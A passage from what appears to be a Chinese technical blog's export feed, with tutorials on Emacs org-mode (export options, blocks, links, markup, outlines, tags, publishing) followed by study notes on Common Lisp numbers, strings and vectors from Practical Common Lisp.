\n:        turn on/off line-break-preservation (DOES NOT WORK)
@:         turn on/off quoted HTML tags
::         turn on/off fixed-width sections
|:         turn on/off tables
^:         turn on/off TeX-like syntax for sub- and superscripts.  If
           you write &quot;^:&#123;&#125;&quot;, a_&#123;b&#125; will be interpreted, but
           the simple a_b will be left as it is.
-:         turn on/off conversion of special strings.
f:         turn on/off footnotes like this[1].
todo:      turn on/off inclusion of TODO keywords into exported text
tasks:     turn on/off inclusion of tasks (TODO items), can be nil to remove
           all tasks, todo to remove DONE tasks, or list of kwds to keep
pri:       turn on/off priority cookies
tags:      turn on/off inclusion of tags, may also be not-in-toc
&lt;:         turn on/off inclusion of any time/date stamps like DEADLINES
*:         turn on/off emphasized text (bold, italic, underlined)
TeX:       turn on/off simple TeX macros in plain text
LaTeX:     configure export of LaTeX fragments.  Default auto
skip:      turn on/off skipping the text before the first heading
author:    turn on/off inclusion of author name/email into exported file
email:     turn on/off inclusion of author email into exported file
creator:   turn on/off inclusion of creator info into exported file
timestamp: turn on/off inclusion creation time into exported file
d:         turn on/off inclusion of drawers
</code></pre>
<p>这些元数据可以根据需要设置。建议放在文档的开头部分。如，本文采用的元数据如下：</p>
<pre><code>#+TITLE: org-mode: 最好的文档编辑利器，没有之一
#+AUTHOR:Holbrook Wong
#+EMAIL: wanghaikuo@gmail.com
#+KEYWORDS: emacs, org-mode
#+OPTIONS: H:4 toc:t 
</code></pre>
<h4 id="内容元数据"><a href="#内容元数据" class="headerlink" title="内容元数据"></a>内容元数据</h4><p>通常在行首以“#+”开头，可以有多种用途。</p>
<p>分行区块</p>
<p>默认内容不换行，需要留出空行才能换行。定义了分行的区块可以实现普通换行：</p>
<pre><code>#+BEGIN_VERSE
 Great clouds overhead
 Tiny black birds rise and fall
 Snow covers Emacs
     -- AlexSchroeder
#+END_VERSE
</code></pre>
<p>缩进区块</p>
<p>通常用于引用，与默认格式相比左右都会留出缩进：</p>
<pre><code>#+BEGIN_QUOTE
  缩进区块
#+END_QUOTE
</code></pre>
<p>居中区块</p>
<pre><code>#+BEGIN_CENTER
Everything should be made as simple as possible, \\
but not any simpler
#+END_CENTER
</code></pre>
<p>代码区块</p>
<pre><code>#+BEGIN_SRC ruby
  require &#39;redcarpet&#39;
  md = Redcarpet.new(&quot;Hello, world.&quot;)
  puts md.to_html
#+END_SRC
</code></pre>
<p>例子</p>
<pre><code>: 单行的例子以冒号开头

#+BEGIN_EXAMPLE
 多行的例子
 使用区块
#+END_EXAMPLE
</code></pre>
<p>注释</p>
<p>以‘#‘开头的行被看作注释，不会被导出</p>
<p>区块注释采用如下写法：</p>
<pre><code>#+BEGIN_COMMENT
  块注释
  ...
 #+END_COMMENT
</code></pre>
<p>表格与图片</p>
<p>对于表格和图片，可以在前面增加标题和标签的说明，以方便交叉引用。</p>
<p>比如在表格的前面添加：</p>
<pre><code>#+CAPTION: This is the caption for the next table (or link)
#+LABEL: tbl:table1
</code></pre>
<p>则在需要的地方可以通过</p>
<pre><code>\ref&#123;table1&#125;
</code></pre>
<p>来引用该表格。</p>
<h4 id="嵌入Html"><a href="#嵌入Html" class="headerlink" title="嵌入Html"></a>嵌入Html</h4><p>对于导出html以及发布，嵌入html代码就很有用。比如下面的例子适用于格式化为cnblogs的代码块：</p>
<pre><code>#+BEGIN_HTML
  
    int main()
  &#123;
    return 0;
  &#125;
  
</code></pre>
<p>#+END_HTML</p>
<p>相当于在cnblogs的网页编辑器中插入”c++”代码。</p>
<h4 id="包含文件"><a href="#包含文件" class="headerlink" title="包含文件"></a>包含文件</h4><p>当导出文档时，你可以包含其他文件中的内容。比如，想包含你的“.emacs”文件，你可以用：</p>
<pre><code>#+INCLUDE: &quot;~/.emacs&quot; src emacs-lisp
</code></pre>
<p>可选的第二个第三个参数是组织方式（例如，“quote”，“example”，或者“src”），如果是<br>“src”，语言用来格式化内容。组织方式是可选的，如果不给出，文本会被当作<br>Org 模式的正常处理。用 C-c ,可以访问包含的文件。</p>
<h4 id="嵌入-LaTex"><a href="#嵌入-LaTex" class="headerlink" title="嵌入 LaTex"></a>嵌入 LaTex</h4><p>对于需要包含数学符号和特殊方程的科学笔记，Org 模式支持嵌入 LaTeX<br>代码到文件中。你可以直接使用类 TeX<br>的宏来输入特殊符号，输入方程，或者整个 LaTeX 环境。</p>
<pre><code>Angles are written as Greek letters \alpha, \beta and \gamma. The mass if
the sun is M_sun = 1.989 x 10^30 kg. The radius of the sun is R_&#123;sun&#125; =
6.96 x 10^8 m. If $a^2=b$ and $b=2$, then the solution must be either
$a=+\sqrt&#123;2&#125;$ or $a=-\sqrt&#123;2&#125;$.
\begin&#123;equation&#125;
x=\sqrt&#123;b&#125;
\end&#123;equation&#125;
</code></pre>
<p>特殊设置之后，导出 HTML 时 LaTeX 代码片断会生成图片并包含进来。</p>
<h3 id="导出"><a href="#导出" class="headerlink" title="导出"></a>导出</h3><p>做好准备工作后，就可以导出了。使用命令：</p>
<pre><code>C-c C-e
</code></pre>
<p>然后选择相应的格式，就可以导出对应的文件了。</p>
<h3 id="发布"><a href="#发布" class="headerlink" title="发布"></a>发布</h3><p>Org 包含一个发布管理系统，可以配置一个由相互链接的 Org<br>文件组成的工程项目的自动向 HTML 转换。你也可以设置 Org，将导出的 HTML<br>页面和相应的附件如图片，源代 码文件等自动上传到服务器。</p>
<p>下面是一个例子：</p>
<pre><code>(setq org-publish-project-alist
     &#39;((&quot;org&quot;
        :base-directory &quot;~/org/&quot;
        :publishing-directory &quot;~/public_html&quot;
        :section-numbers nil
        :table-of-contents nil
        :style &quot;&quot;)))
</code></pre>
<p>发布相关的命令：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>C-c C-e C</td>
<td>提示指明一个项目，将所有的文件发布</td>
</tr>
<tr>
<td>C-c C-e P</td>
<td>发布包含当前文件的项目</td>
</tr>
<tr>
<td>C-c C-e F</td>
<td>只发布当前文件</td>
</tr>
<tr>
<td>C-c C-e E</td>
<td>发布所有项目</td>
</tr>
</tbody></table>
<p>Org<br>用时间戳来查看文件是否改变。上面的命令只发布修改过的文件。你可以给它们加上前缀来强制重新发布所有的文件。</p>
]]></content>
      <categories>
        <category>工具</category>
        <category>Emacs</category>
      </categories>
      <tags>
        <tag>Emacs</tag>
      </tags>
  </entry>
  <entry>
    <title>Emacs org-mode之链接</title>
    <url>/blog/tools/emacs/org-mode/link/</url>
    <content><![CDATA[<p>超链接也是组织内容的一种非常有效的方式。Org<br>支持多种超链接。对于符合要求的图片链接，可以形成图文混排。</p>
<h4 id="创建链接"><a href="#创建链接" class="headerlink" title="创建链接"></a>创建链接</h4><p>对于符合链接规则的内容，org-mode会自动将其视为链接，包括括文件、网页、邮箱、新闻组、BBDB<br>数据库项、IRC 会话和记录等。下面是一些例子：</p>
<pre><code>http://www.astro.uva.nl/~dominik            on the web
file:/home/dominik/images/jupiter.jpg       file, absolute path
/home/dominik/images/jupiter.jpg            same as above
file:papers/last.pdf                        file, relative path
file:projects.org                           another Org file
docview:papers/last.pdf::NNN                open file in doc-view mode at page NNN
id:B7423F4D-2E8A-471B-8810-C40F074717E9     Link to heading by ID
news:comp.emacs                             Usenet link
mailto:adent@galaxy.net                     Mail link
vm:folder                                   VM folder link
vm:folder#id                                VM message link
wl:folder#id                                WANDERLUST message link
mhe:folder#id                               MH-E message link
rmail:folder#id                             RMAIL message link
gnus:group#id                               Gnus article link
bbdb:R.*Stallman                            BBDB link (with regexp)
irc:/irc.com/#emacs/bob                     IRC link
info:org:External%20links                   Info node link (with encoded space)
</code></pre>
<p>对于文件链接，可以用::后面增加定位符的方式链接到文件的特定位置。定位符可以是行号或搜索选项。如：</p>
<pre><code>file:~/code/main.c::255                     进入到 255 行
file:~/xx.org::My Target                    找到目标‘&lt;&gt;’
file:~/xx.org/::#my-custom-id               查找自定义 id 的项
</code></pre>
<p>除了上述的自动链接外，还可以显示指定链接，采用如下格式：</p>
<pre><code>[[link][description]]
[[link]]
</code></pre>
<p>显示指定的链接可以不显示原始的URL而是显示对该链接的描述。<br>这种方式可以用相对路径链接本地文件。</p>
<p>对于显示指定的链接，即可以手工输入，也可以用org-mode提供的快捷键进行编辑：</p>
<table>
<thead>
<tr>
<th>快捷键</th>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>C-c l</td>
<td>?</td>
<td>保存链接</td>
</tr>
<tr>
<td>C-c C-l</td>
<td>org-insert-link</td>
<td>创建或修改链接，可以引用已保存的链接</td>
</tr>
<tr>
<td>C-c C-o</td>
<td>org-open-at-point</td>
<td>打开链接</td>
</tr>
<tr>
<td>C-c %   ?</td>
<td></td>
<td>记录内部链接地址</td>
</tr>
<tr>
<td>C-c &amp;   ?</td>
<td></td>
<td>跳转到已记录的内部链接</td>
</tr>
</tbody></table>
<h4 id="内部链接"><a href="#内部链接" class="headerlink" title="内部链接"></a>内部链接</h4><p>前面的例子都是外部链接，Org-mode还支持内部链接：</p>
<pre><code>定义锚点 #&lt;&gt;
[[my-anchor][内部链接]]
</code></pre>
<p>脚注可以看作是一种特殊的内部链接，但是要求具有”fn:”前缀：</p>
<pre><code>添加脚注链接 [[fn:footprint1][脚注1]]
定义脚注 [fn:footprint1]
</code></pre>
]]></content>
      <categories>
        <category>工具</category>
        <category>Emacs</category>
      </categories>
      <tags>
        <tag>Emacs</tag>
      </tags>
  </entry>
  <entry>
    <title>Emacs org-mode之标记语言</title>
    <url>/blog/tools/emacs/org-mode/marklang/</url>
    <content><![CDATA[<p>前面的大纲和超链接都是使用标记来定义的。实际上，Org现在已经成为一种专门的轻量级标记语言，与Markdown、reStructedText、Textile、RDoc、MediaWiki等并列。</p>
<p>相对于重量级标记语言（如html,<br>xml)，轻量级标记语言的语法简单，书写容易。即使不经过渲染，也可以很容易阅读。用途越来越广泛。<br>比如，gitHub的README文档除了支持纯文本外，还支持丰富的轻量级标记语言，其中就包括Org。</p>
<p>下面来看一下Org还支持哪些标记。</p>
<h3 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h3><pre><code>*粗体*
/斜体/
+删除线+
_下划线_
下标： H_2 O
上标： E=mc^2
等宽字：  =git=  或者 ～git～
</code></pre>
<h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><p>Org 能够很容易地处理 ASCII<br>文本表格。任何以‘|’为首个非空字符的行都会被认为是表格的一部分。’|‘也是列分隔符。一个表格是下面的样子：</p>
<pre><code>| Name  | Pone | Age |
|-------+------+-----|
| Peter | 1234 | 17  |
| Anna  | 4321 | 25  |
</code></pre>
<p>你可能认为要录入这样的表格很繁琐，实际上你只需要输入表头“|Name|Pone|Age”之后，按C-c<br>RET,就可以生成整个表格的结构。类似的快捷键还有很多：</p>
<h4 id=""><a href="#" class="headerlink" title=""></a></h4><table>
<thead>
<tr>
<th>快捷键</th>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>C-c 竖线</td>
<td>?</td>
<td>创建或转换成表格</td>
</tr>
</tbody></table>
<h4 id="调整和区域移动"><a href="#调整和区域移动" class="headerlink" title="调整和区域移动"></a>调整和区域移动</h4><table>
<thead>
<tr>
<th>快捷键</th>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>C-c C-c</td>
<td>?</td>
<td>调整表格，不移动光标</td>
</tr>
<tr>
<td>TAB</td>
<td>?</td>
<td>移动到下一区域，必要时新建一行</td>
</tr>
<tr>
<td>S-TAB</td>
<td>?</td>
<td>移动到上一区域</td>
</tr>
<tr>
<td>RET</td>
<td>?</td>
<td>移动到下一行，必要时新建一行</td>
</tr>
</tbody></table>
<h4 id="编辑行和列"><a href="#编辑行和列" class="headerlink" title="编辑行和列"></a>编辑行和列</h4><table>
<thead>
<tr>
<th>快捷键</th>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>M-LEFT&#x2F;RIGHT</td>
<td>?</td>
<td>移动列</td>
</tr>
<tr>
<td>M-UP&#x2F;DOWN</td>
<td>?</td>
<td>移动行</td>
</tr>
<tr>
<td>M-S-LEFT&#x2F;RIGHT</td>
<td>?</td>
<td>删除&#x2F;插入列</td>
</tr>
<tr>
<td>M-S-UP&#x2F;DOWN</td>
<td>?</td>
<td>删除&#x2F;插入行</td>
</tr>
<tr>
<td>C-c -</td>
<td>?</td>
<td>添加水平分割线</td>
</tr>
<tr>
<td>C-c RET</td>
<td>?</td>
<td>添加水平分割线并跳到下一行</td>
</tr>
<tr>
<td>C-c ^</td>
<td>?</td>
<td>根据当前列排序，可以选择排序方式</td>
</tr>
</tbody></table>
<h3 id="段落"><a href="#段落" class="headerlink" title="段落"></a>段落</h3><p>对于单个回车换行的文本，认为其属于同一个段落。在导出的时候将会转化为不换行的同一段。如果要新起一个段落，需要留出一个空行。<br>这点与MediaWiki类似。</p>
<h3 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h3><p>Org 能够识别有序列表、无序列表和描述列表。</p>
<ul>
<li>无序列表项以‘-’、‘+’或者‘*‘开头。</li>
<li>有序列表项以‘1.’或者‘1)’开头。</li>
<li>描述列表用‘::’将项和描述分开。</li>
<li>有序列表和无序列表都以缩进表示层级。只要对齐缩进，不管是换行还是分块都认为是处于当前列表项。</li>
</ul>
<p>同一列表中的项的第一行必须缩进相同程度。当下一行的缩进与列表项的的开头的符号或者数字相同或者更小时，这一项就结束了。当所有的项都关上时，或者后面有两个空行<br>时，列表就结束了。例如：</p>
<pre><code>My favorite scenes are (in this order)
  1. The attack of the Rohirrim
  2. Eowyn&#39;s fight with the witch king
      + this was already my favorite scene in the book
      + I really like Miranda Otto.
  Important actors in this film are:
  - Elijah Wood :: He plays Frodo
  - Sean Austin :: He plays Sam, Frodo&#39;s friend.
</code></pre>
<p>将显示为：</p>
<pre><code>My favorite scenes are (in this order)

The attack of the Rohirrim
Eowyn&#39;s fight with the witch king
this was already my favorite scene in the book
I really like Miranda Otto.
Important actors in this film are:

Elijah Wood
He plays Frodo
Sean Austin
He plays Sam, Frodo&#39;s friend.
</code></pre>
<h4 id="列表操作快捷键"><a href="#列表操作快捷键" class="headerlink" title="列表操作快捷键"></a>列表操作快捷键</h4><p>为了便利，org-mode也支持很多列表操作的快捷键，大部分都与大纲的快捷键类似：</p>
<table>
<thead>
<tr>
<th>快捷键</th>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>TAB</td>
<td>?</td>
<td>折叠列表项</td>
</tr>
<tr>
<td>M-RET</td>
<td>?</td>
<td>插入项</td>
</tr>
<tr>
<td>M-S-RET</td>
<td>?</td>
<td>插入带复选框的项</td>
</tr>
<tr>
<td>M-S-UP&#x2F;DOWN</td>
<td>?</td>
<td>移动列表项</td>
</tr>
<tr>
<td>M-LEFT&#x2F;RIGHT</td>
<td>?</td>
<td>升&#x2F;降级列表项，不包括子项</td>
</tr>
<tr>
<td>M-S-LEFT&#x2F;RIGTH</td>
<td>?</td>
<td>升&#x2F;降级列表项，包括子项</td>
</tr>
<tr>
<td>C-c C-c</td>
<td>?</td>
<td>改变复选框状态</td>
</tr>
<tr>
<td>C-c -</td>
<td>?</td>
<td>更换列表标记（循环切换）</td>
</tr>
</tbody></table>
<h3 id="分隔线"><a href="#分隔线" class="headerlink" title="分隔线"></a>分隔线</h3><p>五条短线或以上显示为分隔线。</p>
]]></content>
      <categories>
        <category>工具</category>
        <category>Emacs</category>
      </categories>
      <tags>
        <tag>Emacs</tag>
      </tags>
  </entry>
  <entry>
    <title>Emacs org-mode之大纲</title>
    <url>/blog/tools/emacs/org-mode/outline/</url>
    <content><![CDATA[<p>尽管Org-mode的功能不断丰富，现在已经可以记笔记，管理个人事务，制定项目计划以及很多其他的用途，但是最初和最基本的功能还是通过大纲(outline)的方式来编辑文档。<br>而且，无论是笔记管理，任务管理还是项目计划的编写，都是以对内容进行高效的组织（organization)为基础的。</p>
<p>在编辑文档，尤其是大型文档的时候，对内容的组织就显得尤为重要。经常需要在文档中快速定位，只关注某一部分的内容。</p>
<p>Org-mode天然支持大纲视图，通过在文档中定义标题，可以方便的浏览每个小节，从而把握文档的总体内容。<br>Org是基于Outline模式的，它提供了更灵活的编辑结构文件的命令。比如折叠文档，针对大纲的编辑功能等，极其强大。</p>
<h3 id="定义标题"><a href="#定义标题" class="headerlink" title="定义标题"></a>定义标题</h3><p>要实现大纲，首先要定义标题。用emacs新建一个orgmode.org，输入如下内容：</p>
<pre><code>* org-mode
** 大纲
正在编写大纲
** 轻量级标记语言
* 可以导出其他格式
支持html,pdf等格式
</code></pre>
<p>注意：</p>
<p>* 要位于每行的行首</p>
<p>* 之后要有一个空格，然后再输入标题</p>
<p>连续几个*就表示是第几级大纲，最多支持10级。</p>
<p>可以通过大纲操作文档，包括折叠，定位和编辑。而这些操作都通过快捷键实现，非常有效率。尤其是对大文档。</p>
<h3 id="大纲相关的快捷键"><a href="#大纲相关的快捷键" class="headerlink" title="大纲相关的快捷键"></a>大纲相关的快捷键</h3><h4 id="大纲相关的快捷键-1"><a href="#大纲相关的快捷键-1" class="headerlink" title="大纲相关的快捷键"></a>大纲相关的快捷键</h4><table>
<thead>
<tr>
<th>快捷键</th>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>S-TAB</td>
<td>org-shifttab</td>
<td>循环切换整个文档的大纲状态（三种状态：折叠，打开下一级，打开全部）</td>
</tr>
<tr>
<td>TAB</td>
<td>org-cycle</td>
<td>循环切换光标所在大纲的状态</td>
</tr>
</tbody></table>
<h4 id="在大纲之间移动"><a href="#在大纲之间移动" class="headerlink" title="在大纲之间移动"></a>在大纲之间移动</h4><table>
<thead>
<tr>
<th>快捷键</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>C-c C-n&#x2F;p</td>
<td>下&#x2F;上一标题</td>
</tr>
<tr>
<td>C-c C-f&#x2F;b</td>
<td>下&#x2F;上一标题（仅限同级标题）</td>
</tr>
<tr>
<td>C-c C-u</td>
<td>跳到上一级标题</td>
</tr>
<tr>
<td>C-c C-j</td>
<td>切换到大纲浏览状态</td>
</tr>
</tbody></table>
<h4 id="基于大纲的编辑"><a href="#基于大纲的编辑" class="headerlink" title="基于大纲的编辑"></a>基于大纲的编辑</h4><table>
<thead>
<tr>
<th>快捷键</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>M-RET</td>
<td>插入一个同级标题</td>
</tr>
<tr>
<td>M-S-RET</td>
<td>插入一个同级TODO 标题</td>
</tr>
<tr>
<td>M-LEFT&#x2F;RIGHT</td>
<td>将当前标题升&#x2F;降级</td>
</tr>
<tr>
<td>M-S-LEFT&#x2F;RIGHT</td>
<td>将子树升&#x2F;降级</td>
</tr>
<tr>
<td>M-S-UP&#x2F;DOWN</td>
<td>将子树上&#x2F;下移</td>
</tr>
<tr>
<td>C-c *</td>
<td>将本行设为标题&#x2F;正文</td>
</tr>
<tr>
<td>C-c C-w</td>
<td>将子树或区域移动到另一标题处（跨缓冲区）</td>
</tr>
<tr>
<td>C-x n s&#x2F;w</td>
<td>只显示当前子树&#x2F;返回</td>
</tr>
<tr>
<td>C-c C-x b</td>
<td>在新缓冲区显示当前分支（类似C-x n s)</td>
</tr>
<tr>
<td>C-c &#x2F;</td>
<td>只列出包含搜索结果的大纲，并高亮，支持多种搜索方式</td>
</tr>
<tr>
<td>C-c C-c</td>
<td>取消高亮</td>
</tr>
</tbody></table>
<h4 id="大纲的显示方式"><a href="#大纲的显示方式" class="headerlink" title="大纲的显示方式"></a>大纲的显示方式</h4><p>默认的大纲显示没有缩进，显得有些乱。可以用 M-x<br>org-indent-mode切换到另一种显示方式.</p>
<p>如果想让某个文件默认用这种方式打开，可以在文件头部增加：</p>
<pre><code>#+STARTUP: indent
</code></pre>
<p>如果希望打开所有org文件都默认用这种方式，可以在.emacs中配置：</p>
<pre><code>(setq org-startup-indented t)
</code></pre>
]]></content>
      <categories>
        <category>工具</category>
        <category>Emacs</category>
      </categories>
      <tags>
        <tag>Emacs</tag>
      </tags>
  </entry>
  <entry>
    <title>Emacs org-mode之tag</title>
    <url>/blog/tools/emacs/org-mode/tag/</url>
    <content><![CDATA[<h3 id="tag的作用"><a href="#tag的作用" class="headerlink" title="tag的作用"></a>tag的作用</h3><p>对于信息的管理，有分类(category)和标签(tag)两种方式。这两种方式各有特点：通常分类是固定的，很少变化，而tag随时可以增加。<br>分类通常表现为树状结构，比较清晰，但是树状结构过于简单，不能表达复杂的信息。比如，如果有多个分类树，处理起来就会比较麻烦。</p>
<p>所以，这两种方式通常结合起来使用。比如blog系统中，通常既支持文章的分类（树），又支持为每篇文章作tag标记。</p>
<h3 id="标记tag"><a href="#标记tag" class="headerlink" title="标记tag"></a>标记tag</h3><p>在Org-mode中，可以对标题增加tag标记。标记的格式如下：</p>
<pre><code>这是要标记的文字     :标记1:标记2
</code></pre>
<p>而且Org-mode的标签自动按照大纲树的结构继承。即子标题自动继承父标题的标签。比如：</p>
<pre><code>* Meeting with the French group     :work:
** Summary by Frank                 :boss:notes:
*** TODO Prepare slides for him     :action:
</code></pre>
<p>则最后一行标题具有 work, boss, notes, action 四个标签。</p>
<p>如果希望文档中的所有标题都具有某些标签，只需要定义文档元数据：</p>
<pre><code>#+FILETAGS: :Peter:Boss:Secret:
</code></pre>
<p>如果手工输入标签，在标题后设置标签，键入:后，M-Tab自动提供标签的补齐。</p>
<p>更方便的做法是在正文部分用C-c C-q 或直接在标题上用C-c<br>C-c创建标签，这种方式可以列出所有预定义的标签以便选取。</p>
<h3 id="预定义tag"><a href="#预定义tag" class="headerlink" title="预定义tag"></a>预定义tag</h3><p>上面提到，除了可以输入标签外，还可以从预定义的标签中进行选择。预定义的方式有两种：</p>
<p>在当前文件头部定义</p>
<p>这种方式预定义的标签只能在当前文件中使用。使用#+TAGS元数据进行标记，如：</p>
<pre><code>#+TAGS: &#123; 桌面(d) 服务器(s) &#125;  编辑器(e) 浏览器(f) 多媒体(m) 压缩(z)    
</code></pre>
<p>对标签定义进行修改后，要在标签定义的位置按 C-c C-c 刷新才能生效。</p>
<p>在配置文件中定义 上面的标签定义只能在当前文件生效，如果要在所有的.org<br>文件中生效，需要在 Emacs 配置文件 .emacs 中进行定义：</p>
<pre><code>(setq org-tag-alist &#39;(

                    (:startgroup . nil)
                         (&quot;桌面&quot; . ?d) (&quot;服务器&quot; . ?s)
                    (:endgroup . nil)
                    (&quot;编辑器&quot; . ?e)
                    (&quot;浏览器&quot; . ?f) 
                    (&quot;多媒体&quot; . ?m)
                    ))    
</code></pre>
<p>默认情况下，org会动态维护一个Tag列表，即当前输入的标签若不在列表中，则自动加入列表以供下次补齐使用。</p>
<p>为了使这几种情况（默认列表、文件预设tags，全局预设tags）同时生效，需要在文件中增加一个空的TAGS定义：</p>
<pre><code>#+TAGS:
</code></pre>
<h3 id="按tag搜索"><a href="#按tag搜索" class="headerlink" title="按tag搜索"></a>按tag搜索</h3><p>使用标签可以更好的管理内容。org-mode提供了以下功能：</p>
<table>
<thead>
<tr>
<th>KEYS</th>
<th>COMMENT</th>
</tr>
</thead>
<tbody><tr>
<td>C-c \</td>
<td>按tag搜索标题</td>
</tr>
<tr>
<td>C-c &#x2F; m</td>
<td>搜索并按树状结构显示</td>
</tr>
<tr>
<td>C-c a m</td>
<td>按标签搜索多个文件（需要将文件加入全局agenda)</td>
</tr>
</tbody></table>
<p>可以使用逻辑表达式限制条件，更准确灵活的搜索</p>
<pre><code>+     和      a+b     同时有这两个标签
-     排除    a-b     有 a 但没有 b
|     或      a|b     有 a 或者有 b
&amp;     和      a&amp;b     同时有 a 和 b，可以用“+”替代
</code></pre>
<p>在查询视图中 C-c C-c 退出</p>
]]></content>
      <categories>
        <category>工具</category>
        <category>Emacs</category>
      </categories>
      <tags>
        <tag>Emacs</tag>
      </tags>
  </entry>
  <entry>
    <title>第10章 数字和字符串-实用Common Lisp编程笔记</title>
    <url>/blog/plang/lisp/pcldiary/chapter10/</url>
    <content><![CDATA[<p>lisp支持精确比值。</p>
<p>数字更接近于真正的数学数字。</p>
<p>common lisp整数可以任意大。</p>
<p>整数相除得到一个确切的比值，可以表示任意数度的分数。</p>
<p>common lisp支持复数。</p>
<h2 id="字面数值"><a href="#字面数值" class="headerlink" title="字面数值"></a>字面数值</h2><p>lisp读取器-&gt;lisp求值器</p>
<p>10、20&#x2F;2、#xA读取器会转化为同一个对象。</p>
<pre><code>CL-USER&gt; 10
10
CL-USER&gt; 20/2
10
CL-USER&gt; #xA
10
CL-USER&gt; 
</code></pre>
<p>123</p>
<p>+123</p>
<p>-123</p>
<ol start="123">
<li></li>
</ol>
<p>2&#x2F;3</p>
<p>-2&#x2F;3</p>
<p>4&#x2F;6-&gt;2&#x2F;3</p>
<p>6&#x2F;3-&gt;2</p>
<h3 id="进制"><a href="#进制" class="headerlink" title="进制"></a>进制</h3><p>#b 二进制</p>
<p>#b10101-&gt;21</p>
<p>#b1010&#x2F;1011-&gt;10&#x2F;11</p>
<p>#o 八进制</p>
<p>#o777-&gt;511</p>
<p>#x 十六进制</p>
<p>#xDADA-&gt;56026</p>
<p>#nR n进制</p>
<p>#36rz-35</p>
<h3 id="浮点数"><a href="#浮点数" class="headerlink" title="浮点数"></a>浮点数</h3><p>数字总是以10进制表示，#x、#b、#o、#r只用于有理数。</p>
<p>1.0-&gt;1.0</p>
<p>1e0-&gt;1.0</p>
<p>1d0-&gt;1.0d0</p>
<p>123.0</p>
<p>123e0</p>
<p>0.123-&gt;0.123</p>
<p>.123-&gt;0.123</p>
<p>123e-3-&gt;0.123</p>
<p>123E-3-&gt;0.123</p>
<p>0.123e20-&gt;1.23e+19</p>
<p>123d23-&gt;1.23d+25</p>
<h3 id="复数"><a href="#复数" class="headerlink" title="复数"></a>复数</h3><p>#c(实部 虚部)</p>
<h3 id="初等数学"><a href="#初等数学" class="headerlink" title="初等数学"></a>初等数学</h3><p>运算符：+ - * &#x2F;</p>
<p>国为&#x2F;不做截断处理，common lisp 提供了4种类型截断和舍入函数。</p>
<p>floor:向负无穷方向截断，返回小于等于实参的最大整数。</p>
<p>ceiling:向正无穷截断。</p>
<p>truncate:向零截断。</p>
<p>round:舍入，中间取偶。</p>
<h3 id="数值比较"><a href="#数值比较" class="headerlink" title="数值比较"></a>数值比较</h3><p>&#x3D; &lt; &gt; &lt;&#x3D; &gt;&#x3D; &#x2F;&#x3D;：可以比较两个或多个值。</p>
<p>max min：可以取最大最小值。</p>
<h2 id="字符"><a href="#字符" class="headerlink" title="字符"></a>字符</h2><p>#\跟想要的字符。</p>
<p>特殊字符跟名称，#\Space,#\Newline。</p>
<h3 id="字符比较"><a href="#字符比较" class="headerlink" title="字符比较"></a>字符比较</h3><p>CHAR&#x3D; CHAR&#x2F;&#x3D; CHAR&lt; CHAR&gt; CHAR&lt;&#x3D; CHAR&gt;&#x3D; :多个参数，大小写相关。</p>
<p>CHAR-EQUAL:多个都相等，大小写无关。</p>
<h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>REPL原样打印字符串，看真实内容用format。</p>
<p>CL-USER&gt; “foo&quot;bar”<br>“foo&quot;bar”<br>CL-USER&gt; (format t “foo&quot;bar”)<br>foo”bar<br>NIL<br>CL-USER&gt; </p>
<p>比较</p>
<p>STRING&#x3D; STRING&#x2F;&#x3D; STRING&lt; STRING&gt; STRING&lt;&#x3D; STRING&gt;&#x3D;</p>
<p>只能比较两个串，因为还有参数。</p>
<p>:start1 :end1 :start2 :end2</p>
<p>左闭右开，指定两个串的起始和结束位置。</p>
<p>所有序列函数都可用于字符串。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>Lisp</category>
        <category>Common Lisp</category>
      </categories>
      <tags>
        <tag>Common Lisp</tag>
      </tags>
  </entry>
  <entry>
    <title>第11章 集合-实用Common Lisp编程笔记</title>
    <url>/blog/plang/lisp/pcldiary/chapter11/</url>
    <content><![CDATA[<h2 id="向量"><a href="#向量" class="headerlink" title="向量"></a>向量</h2><h3 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h3><pre><code>CL-USER&gt; (vector)
#()
CL-USER&gt; (vector 1)
#(1)
CL-USER&gt; (vector 1 2)
#(1 2)
CL-USER&gt; #(1 2)
#(1 2)
</code></pre>
<p><code>#(...)</code>是Lisp打印器和读取器使用向量的字面形式，可以用print和read打印和恢复重向量。</p>
<p>可以用<code>#(...)</code>添加向量，但更建议用vector创建要修改的向量。</p>
<h3 id="make-array"><a href="#make-array" class="headerlink" title="make-array"></a>make-array</h3><p>make-array可以创建任何维度的数组及定长和变长向量。</p>
<pre><code>CL-USER&gt; (make-array 5 :initial-element nil)
#(NIL NIL NIL NIL NIL)
</code></pre>
<p>创建可填充的向量</p>
<pre><code>CL-USER&gt; (defparameter *x* (make-array 5 :fill-pointer 0))
*X*
CL-USER&gt; (vector-push &#39;a *x*)
0
CL-USER&gt; *x*
#(A)
CL-USER&gt; (vector-push &#39;b *x*)
1
CL-USER&gt; (vector-push &#39;c *x*)
2
CL-USER&gt; (vector-push &#39;d *x*)
3
CL-USER&gt; (vector-push &#39;e *x*)
4
CL-USER&gt; (vector-push &#39;f *x*)
NIL
CL-USER&gt; *x*
#(A B C D E)
CL-USER&gt; (vector-pop *x*)
E
CL-USER&gt; (vector-pop *x*)
D
CL-USER&gt; (vector-pop *x*)
C
CL-USER&gt; *x*
#(A B)
CL-USER&gt; 
</code></pre>
<p>创建可变长的向量</p>
<pre><code>(make-array 5 :fill-pointer 0 :adjustable t)
</code></pre>
